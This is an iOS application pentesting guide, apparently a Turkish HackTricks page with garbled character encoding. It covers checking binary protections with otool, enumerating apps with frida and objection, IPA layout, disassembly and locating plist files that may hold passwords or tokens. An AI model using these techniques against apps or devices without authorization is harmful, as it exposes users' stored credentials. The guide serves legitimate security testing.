# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini edinin**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github depolarÄ±na PR gÃ¶nderin.

</details>

## iOS Temelleri

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Test OrtamÄ±

Bu sayfada **iOS simÃ¼latÃ¶rÃ¼**, **emÃ¼latÃ¶rler** ve **jailbreak** hakkÄ±nda bilgi bulabilirsiniz:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Ä°lk Analiz

### Temel iOS Test Ä°ÅŸlemleri

Test sÄ±rasÄ±nda **Ã§eÅŸitli iÅŸlemler Ã¶nerilecektir** (cihaza baÄŸlanma, dosya okuma/yazma/yÃ¼kleme/indirme, bazÄ± araÃ§larÄ± kullanma...). Bu nedenle, bu iÅŸlemlerin nasÄ±l gerÃ§ekleÅŸtirileceÄŸini bilmiyorsanÄ±z lÃ¼tfen **sayfayÄ± okumaya baÅŸlayÄ±n**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
AÅŸaÄŸÄ±daki adÄ±mlar iÃ§in **uygulamanÄ±n cihaza yÃ¼klenmiÅŸ olmasÄ±** ve uygulamanÄ±n **IPA dosyasÄ±nÄ±n zaten edinilmiÅŸ olmasÄ±** gerekmektedir.\
Bunu nasÄ±l yapacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in [Temel iOS Test Ä°ÅŸlemleri](basic-ios-testing-operations.md) sayfasÄ±nÄ± okuyun.
{% endhint %}

### Temel Statik Analiz

**MobSF** aracÄ±nÄ± kullanarak IPA dosyasÄ±na otomatik Statik Analiz yapmanÄ±z Ã¶nerilir.

**Binary'de bulunan korumalarÄ±n tanÄ±mlanmasÄ±**:

*   **PIE (Konum BaÄŸÄ±msÄ±z YÃ¼rÃ¼tÃ¼lebilir)**: EtkinleÅŸtirildiÄŸinde, uygulama her baÅŸlatÄ±ldÄ±ÄŸÄ±nda rastgele bir bellek adresine yÃ¼klenir, baÅŸlangÄ±Ã§ bellek adresini tahmin etmeyi zorlaÅŸtÄ±rÄ±r.

```bash
otool -hv <app-binary> | grep PIE   # PIE bayraÄŸÄ±nÄ± iÃ§ermesi gerekmektedir
```
*   **YÄ±ÄŸÄ±n KanaryalarÄ±**: YÄ±ÄŸÄ±nÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulamak iÃ§in bir 'kanarya' deÄŸeri bir iÅŸlevi Ã§aÄŸÄ±rmadan Ã¶nce yÄ±ÄŸÄ±na yerleÅŸtirilir ve iÅŸlev sona erdiÄŸinde yeniden doÄŸrulanÄ±r.

```bash
otool -I -v <app-binary> | grep stack_chk   # stack_chk_guard ve stack_chk_fail sembollerini iÃ§ermesi gerekmektedir
```
*   **ARC (Otomatik Referans SayÄ±mÄ±)**: Ortak bellek bozulma hatalarÄ±nÄ± Ã¶nlemek iÃ§in

```bash
otool -I -v <app-binary> | grep objc_release   # _objc_release sembolÃ¼nÃ¼ iÃ§ermesi gerekmektedir
```
*   **ÅifrelenmiÅŸ Binary**: Binary ÅŸifrelenmiÅŸ olmalÄ±dÄ±r

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid 1 olmalÄ±dÄ±r
```

**Hassas/GÃ¼vensiz FonksiyonlarÄ±n TanÄ±mlanmasÄ±**

*   **ZayÄ±f Hashleme AlgoritmalarÄ±**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Linux Ã¼zerinde
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **GÃ¼vensiz Rastgele Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Linux Ã¼zerinde
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **GÃ¼vensiz 'Malloc' Fonksiyonu**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_malloc"

# Linux Ã¼zerinde
grep -iER "_malloc"
```
*   **GÃ¼vensiz ve KÃ¶tÃ¼ye KullanÄ±labilir Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Linux Ã¼zerinde
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Temel Dinamik Analiz

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) tarafÄ±ndan gerÃ§ekleÅŸtirilen dinamik analize gÃ¶z atÄ±n. FarklÄ± gÃ¶rÃ¼nÃ¼mler arasÄ±nda gezinmeniz ve etkileÅŸimde bulunmanÄ±z gerekecek, ancak birÃ§ok sÄ±nÄ±fa kanca takacak ve diÄŸer iÅŸlemleri yapacak ve iÅŸiniz bittiÄŸinde bir rapor hazÄ±rlayacaktÄ±r.

### YÃ¼klÃ¼ UygulamalarÄ±n Listelenmesi

`frida-ps -Uai` komutunu kullanarak yÃ¼klÃ¼ uygulamalarÄ±n **paket tanÄ±mlayÄ±cÄ±sÄ±nÄ±** belirleyin:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Temel NumaralandÄ±rma ve Hooking

UygulamanÄ±n bileÅŸenlerini **numaralandÄ±rma** ve yÃ¶ntemleri ve sÄ±nÄ±flarÄ± kolayca **hooklama** konusunda objection ile nasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenin:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA YapÄ±sÄ±

Bir **IPA dosyasÄ±nÄ±n** yapÄ±sÄ± temelde bir **sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ paketin** yapÄ±sÄ±dÄ±r. UzantÄ±sÄ±nÄ± `.zip` olarak deÄŸiÅŸtirerek, iÃ§eriÄŸini ortaya Ã§Ä±karmak iÃ§in **aÃ§Ä±labilir**. Bu yapÄ± iÃ§inde, bir **Paket** uygulamanÄ±n kurulmaya hazÄ±r tamamen paketlenmiÅŸ bir uygulamayÄ± temsil eder. Ä°Ã§inde, uygulamanÄ±n kaynaklarÄ±nÄ± kapsayan `<NAME>.app` adÄ±nda bir dizin bulacaksÄ±nÄ±z.

* **`Info.plist`**: Bu dosya uygulamanÄ±n belirli yapÄ±landÄ±rma detaylarÄ±nÄ± tutar.
* **`_CodeSignature/`**: Bu dizin, paketteki tÃ¼m dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ saÄŸlayan bir imza iÃ§eren bir plist dosyasÄ±nÄ± iÃ§erir.
* **`Assets.car`**: Simgeler gibi varlÄ±k dosyalarÄ±nÄ± depolayan sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ bir arÅŸiv.
* **`Frameworks/`**: Bu klasÃ¶r uygulamanÄ±n yerel kÃ¼tÃ¼phanelerini barÄ±ndÄ±rÄ±r, bu kÃ¼tÃ¼phaneler `.dylib` veya `.framework` dosyalarÄ± ÅŸeklinde olabilir.
* **`PlugIns/`**: Bu, uygulamanÄ±n uzantÄ±larÄ±nÄ± iÃ§erebilir, `.appex` dosyalarÄ± olarak bilinirler, ancak her zaman mevcut deÄŸillerdir.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): UygulamanÄ±zÄ±n kalÄ±cÄ± verilerini Ã§evrimdÄ±ÅŸÄ± kullanÄ±m iÃ§in kaydetmek, geÃ§ici verileri Ã¶nbelleÄŸe almak ve uygulamanÄ±za tek bir cihazda geri alma iÅŸlevselliÄŸi eklemek iÃ§in kullanÄ±lÄ±r. Bir iCloud hesabÄ±nda birden fazla cihaz arasÄ±nda veri senkronizasyonu yapmak iÃ§in, Core Data otomatik olarak ÅŸemanÄ±zÄ± bir CloudKit konteynerine yansÄ±tÄ±r.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` dosyasÄ± uygulamanÄ±zÄ±n veya paketinizin tÃ¼rÃ¼nÃ¼ ve yaratÄ±cÄ± kodlarÄ±nÄ± belirtmenin alternatif bir yoludur.
* **en.lproj, fr.proj, Base.lproj**: Bu, belirli diller iÃ§in kaynaklarÄ± iÃ§eren dil paketleridir ve bir dil desteklenmiyorsa varsayÄ±lan bir kaynak iÃ§erir.
* **GÃ¼venlik**: `_CodeSignature/` dizini, dijital imzalar aracÄ±lÄ±ÄŸÄ±yla tÃ¼m paketlenmiÅŸ dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulayarak uygulamanÄ±n gÃ¼venliÄŸinde kritik bir rol oynar.
* **VarlÄ±k YÃ¶netimi**: `Assets.car` dosyasÄ±, grafik varlÄ±klarÄ± etkin bir ÅŸekilde yÃ¶netmek iÃ§in sÄ±kÄ±ÅŸtÄ±rma kullanÄ±r, bu da uygulama performansÄ±nÄ± optimize etmek ve genel boyutunu azaltmak iÃ§in Ã¶nemlidir.
* **KÃ¼tÃ¼phaneler ve Eklentiler**: Bu dizinler, iOS uygulamalarÄ±nÄ±n modÃ¼lerliÄŸini vurgular, geliÅŸtiricilere tekrar kullanÄ±labilir kod kÃ¼tÃ¼phaneleri (`Frameworks/`) eklemeleri geniÅŸletmelerine izin verir (`PlugIns/`).
* **YerelleÅŸtirme**: YapÄ±, birden fazla dil desteÄŸini destekler, belirli dil paketleri iÃ§in kaynaklarÄ± iÃ§ererek kÃ¼resel uygulama eriÅŸimini kolaylaÅŸtÄ±rÄ±r.

**Info.plist**

**Info.plist**, iOS uygulamalarÄ± iÃ§in bir kÃ¶ÅŸetaÅŸÄ± olarak hizmet eder, temel yapÄ±landÄ±rma verilerini **anahtar-deÄŸer** Ã§iftleri ÅŸeklinde kapsar. Bu dosya sadece uygulamalar iÃ§in deÄŸil, aynÄ± zamanda uygulama uzantÄ±larÄ± ve iÃ§inde paketlenmiÅŸ Ã§erÃ§eveler iÃ§in de gereklidir. XML veya ikili bir formatta yapÄ±landÄ±rÄ±lmÄ±ÅŸ olup, uygulama izinlerinden gÃ¼venlik yapÄ±landÄ±rmalarÄ±na kadar kritik bilgileri iÃ§erir. Mevcut anahtarlar hakkÄ±nda detaylÄ± bir keÅŸif iÃ§in, [**Apple GeliÅŸtirici Belgelerine**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc) baÅŸvurulabilir.

Bu dosya ile Ã§alÄ±ÅŸmak isteyenler iÃ§in daha eriÅŸilebilir bir formatta Ã§alÄ±ÅŸmak iÃ§in XML dÃ¶nÃ¼ÅŸÃ¼mÃ¼, macOS'ta (`plutil` ile, 10.2 ve sonraki sÃ¼rÃ¼mlerde doÄŸal olarak mevcuttur) veya Linux'ta (`plistutil` ile) kolayca gerÃ§ekleÅŸtirilebilir. DÃ¶nÃ¼ÅŸÃ¼m komutlarÄ± ÅŸunlardÄ±r:

* **macOS iÃ§in**:
```bash
$ plutil -convert xml1 Info.plist
```
* **Linux iÃ§in**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Info.plist** dosyasÄ±nÄ±n ifÅŸa edebileceÄŸi bilgi yelpazesinin arasÄ±nda, dikkate deÄŸer giriÅŸler arasÄ±nda uygulama izni dizeleri (`UsageDescription`), Ã¶zel URL ÅŸemalarÄ± (`CFBundleURLTypes`), ve App Transport Security iÃ§in yapÄ±landÄ±rmalar (`NSAppTransportSecurity`) bulunmaktadÄ±r. Bu giriÅŸler, `grep` komutunu kullanarak dosyayÄ± inceleyerek veya basit bir ÅŸekilde yerini tespit edebilir.
```bash
$ grep -i <keyword> Info.plist
```
**Veri YollarÄ±**

iOS ortamÄ±nda, dizinler Ã¶zellikle **sistem uygulamalarÄ±** ve **kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar** iÃ§in ayrÄ±lmÄ±ÅŸtÄ±r. Sistem uygulamalarÄ± `/Applications` dizininde bulunurken, kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar `/private/var/containers/` altÄ±na yerleÅŸtirilir. Bu uygulamalara **128-bit UUID** olarak bilinen benzersiz bir kimlik atamasÄ± yapÄ±lÄ±r, bu nedenle uygulamanÄ±n klasÃ¶rÃ¼nÃ¼ manuel olarak bulmak rastgele dizin adlarÄ± nedeniyle zor olabilir.

KullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen bir uygulamanÄ±n kurulum dizinini keÅŸfetmeyi kolaylaÅŸtÄ±rmak iÃ§in **objection aracÄ±** yararlÄ± bir `env` komutu saÄŸlar. Bu komut, sÃ¶z konusu uygulama iÃ§in ayrÄ±ntÄ±lÄ± dizin bilgilerini ortaya Ã§Ä±karÄ±r. AÅŸaÄŸÄ±da bu komutun nasÄ±l kullanÄ±lacaÄŸÄ±na dair bir Ã¶rnek bulunmaktadÄ±r:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatif olarak, uygulama adÄ± `find` komutu kullanÄ±larak `/private/var/containers` iÃ§inde aranabilir:
```bash
find /private/var/containers -name "Progname*"
```
Komutlar `ps` ve `lsof` gibi, sÄ±rasÄ±yla uygulamanÄ±n iÅŸlemini tanÄ±mlamak ve aÃ§Ä±k dosyalarÄ± listelemek iÃ§in de kullanÄ±labilir, uygulamanÄ±n etkin dizin yollarÄ±na dair iÃ§gÃ¶rÃ¼ler saÄŸlar:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Paket dizini:**

* **AppName.app**
* Bu, IPA'da daha Ã¶nce gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi Uygulama Paketi olup, temel uygulama verilerini, statik iÃ§eriÄŸi ve uygulamanÄ±n derlenmiÅŸ ikilisini iÃ§erir.
* Bu dizin kullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r, ancak **kullanÄ±cÄ±lar yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Bu klasÃ¶rÃ¼n iÃ§eriÄŸi kod imzasÄ±nÄ± **doÄŸrulamak** iÃ§in kullanÄ±lÄ±r.

**Veri dizini:**

* **Documents/**
* TÃ¼m kullanÄ±cÄ± tarafÄ±ndan oluÅŸturulan verileri iÃ§erir. Uygulama son kullanÄ±cÄ± bu verilerin oluÅŸturulmasÄ±nÄ± baÅŸlatÄ±r.
* KullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r ve **kullanÄ±cÄ±lar yazabilir**.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/**
* **KullanÄ±cÄ±ya Ã¶zgÃ¼ olmayan dosyalarÄ±** iÃ§erir, **Ã¶n bellekler**, **tercihler**, **Ã§erezler** ve Ã¶zellik listesi (plist) yapÄ±landÄ±rma dosyalarÄ± gibi.
* iOS uygulamalarÄ± genellikle `Application Support` ve `Caches` alt dizinlerini kullanÄ±r, ancak uygulama Ã¶zel alt dizinler oluÅŸturabilir.
* **Library/Caches/**
* **YarÄ± kalÄ±cÄ± Ã¶nbellek dosyalarÄ±nÄ±** iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez ve kullanÄ±cÄ±lar yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Uygulama Ã§alÄ±ÅŸmÄ±yorken ve depolama alanÄ± azaldÄ±ÄŸÄ±nda iÅŸletim sistemi bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.
* **Library/Application Support/**
* UygulamanÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in gerekli olan **kalÄ±cÄ± dosyalarÄ±** iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez ve kullanÄ±cÄ±lar yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/Preferences/**
* Bir uygulama yeniden baÅŸlatÄ±ldÄ±ktan sonra bile **kalÄ±cÄ± olabilen Ã¶zellikleri** depolamak iÃ§in kullanÄ±lÄ±r.
* Bilgiler, \[BUNDLE\_ID].plist adlÄ± bir plist dosyasÄ±nda ÅŸifrelenmemiÅŸ olarak uygulama sandbox'Ä±nÄ±n iÃ§inde kaydedilir.
* `NSUserDefaults` kullanÄ±larak depolanan tÃ¼m anahtar/deÄŸer Ã§iftleri bu dosyada bulunabilir.
* **tmp/**
* Uygulama baÅŸlatmalarÄ± arasÄ±nda kalÄ±cÄ± olmasÄ± gerekli olmayan **geÃ§ici dosyalarÄ±** yazmak iÃ§in bu dizini kullanÄ±n.
* KalÄ±cÄ± olmayan Ã¶nbellek dosyalarÄ±nÄ± iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Uygulama Ã§alÄ±ÅŸmÄ±yorken ve depolama alanÄ± azaldÄ±ÄŸÄ±nda iÅŸletim sistemi bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.

iGoat-Swift'in Uygulama Paketi (.app) dizinine daha yakÄ±ndan bakalÄ±m, Bundle dizini iÃ§inde (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Tersine MÃ¼hendislik

`<application-name>.app` klasÃ¶rÃ¼ iÃ§inde `<application-name>` adÄ±nda bir ikili dosya bulacaksÄ±nÄ±z. Bu dosya **Ã§alÄ±ÅŸtÄ±rÄ±lacak** dosyadÄ±r. Ä°kili dosyayÄ± temel bir inceleme yapmak iÃ§in **`otool`** aracÄ±nÄ± kullanabilirsiniz:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**UygulamanÄ±n ÅŸifrelenip ÅŸifrelenmediÄŸini kontrol edin**

AÅŸaÄŸÄ±daki Ã§Ä±ktÄ±larÄ± kontrol edin:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Binary dosyasÄ±nÄ±n ayrÄ±ÅŸtÄ±rÄ±lmasÄ±**

Metin bÃ¶lÃ¼mÃ¼nÃ¼ ayrÄ±ÅŸtÄ±rÄ±n:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
**Ã–rnek uygulamanÄ±n Objective-C segmentini** yazdÄ±rmak iÃ§in ÅŸunu kullanabilirsiniz:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Objective-C kodunu daha kompakt hale getirmek iÃ§in [**class-dump**](http://stevenygard.com/projects/class-dump/) kullanabilirsiniz:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ancak, ikili dosyayÄ± Ã§Ã¶zÃ¼mlemek iÃ§in en iyi seÃ§enekler: [**Hopper**](https://www.hopperapp.com/download.html?) ve [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatikleÅŸtirilmiÅŸ iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve **kolayca** kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Veri Depolama

iOS'un cihazda veri depolama yÃ¶ntemlerini Ã¶ÄŸrenmek iÃ§in bu sayfayÄ± okuyun:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Uygulama **kurulduktan hemen sonra**, uygulamanÄ±n **tÃ¼m iÅŸlevleri kontrol edildikten sonra** ve hatta **bir kullanÄ±cÄ±dan Ã§Ä±kÄ±p farklÄ± bir kullanÄ±cÄ±ya giriÅŸ yapÄ±ldÄ±ktan sonra** bilgi depolama yerleri kontrol edilmelidir.\
AmaÃ§, uygulamanÄ±n (ÅŸifreler, tokenlar), mevcut kullanÄ±cÄ±nÄ±n ve Ã¶nceki oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ±n **korumasÄ±z hassas bilgilerini** bulmaktÄ±r.
{% endhint %}

### Plist

**plist** dosyalarÄ±, **anahtar-deÄŸer Ã§iftlerini iÃ§eren** yapÄ±landÄ±rÄ±lmÄ±ÅŸ XML dosyalarÄ±dÄ±r. KalÄ±cÄ± verileri depolamanÄ±n bir yoludur, bu nedenle bazen bu dosyalarda **hassas bilgiler bulabilirsiniz**. Bu dosyalarÄ±n uygulamayÄ± yÃ¼kledikten sonra ve yoÄŸun bir ÅŸekilde kullandÄ±ktan sonra kontrol edilmesi Ã¶nerilir, bÃ¶ylece yeni verilerin yazÄ±lÄ±p yazÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz.

Plist dosyalarÄ±nda veri saklamanÄ±n en yaygÄ±n yolu **NSUserDefaults**'un kullanÄ±mÄ±dÄ±r. Bu plist dosyasÄ±, **`Library/Preferences/<appBundleID>.plist`** iÃ§inde uygulama kum havuzunda kaydedilir.

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) sÄ±nÄ±fÄ±, varsayÄ±lan sistemle etkileÅŸim iÃ§in programatik bir arayÃ¼z saÄŸlar. VarsayÄ±lan sistem, bir uygulamanÄ±n davranÄ±ÅŸÄ±nÄ± **kullanÄ±cÄ± tercihlerine** gÃ¶re Ã¶zelleÅŸtirmesine izin verir. `NSUserDefaults` tarafÄ±ndan kaydedilen veriler uygulama kum havuzunda gÃ¶rÃ¼lebilir. Bu sÄ±nÄ±f, **veriyi** bir **plist** **dosyasÄ±nda** saklar, ancak kÃ¼Ã§Ã¼k miktarlarda veriyle kullanÄ±lmasÄ± amaÃ§lanmÄ±ÅŸtÄ±r.

Bu verilere doÄŸrudan gÃ¼venilir bir bilgisayar Ã¼zerinden eriÅŸilemez, ancak bir **yedekleme** yaparak eriÅŸilebilir.

`NSUserDefaults` kullanÄ±larak kaydedilen bilgileri **`NSUserDefaults`** kullanarak Ã§Ã¶pe atabilirsiniz.

Uygulama tarafÄ±ndan kullanÄ±lan tÃ¼m plist dosyalarÄ±nÄ± bulmak iÃ§in `/private/var/mobile/Containers/Data/Application/{APPID}`'e eriÅŸebilir ve ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
find ./ -name "*.plist"
```
**XML veya ikili (bplist) formatÄ±ndaki dosyalarÄ± XML'e dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in, iÅŸletim sisteminize baÄŸlÄ± olarak Ã§eÅŸitli yÃ¶ntemler mevcuttur:**

**MacOS KullanÄ±cÄ±larÄ± iÃ§in:** `plutil` komutunu kullanÄ±n. Bu amaÃ§la tasarlanmÄ±ÅŸ olan macOS'ta (10.2+) yerleÅŸik bir araÃ§tÄ±r.
```bash
$ plutil -convert xml1 Info.plist
```
**Linux KullanÄ±cÄ±larÄ± iÃ§in:** Ä°lk olarak `libplist-utils`'Ä± yÃ¼kleyin, ardÄ±ndan dosyanÄ±zÄ± dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in `plistutil`'Ä± kullanÄ±n:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Objection Oturumu Ä°Ã§inde:** Mobil uygulamalarÄ± analiz etmek iÃ§in belirli bir komut, plist dosyalarÄ±nÄ± doÄŸrudan dÃ¶nÃ¼ÅŸtÃ¼rmenizi saÄŸlar:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

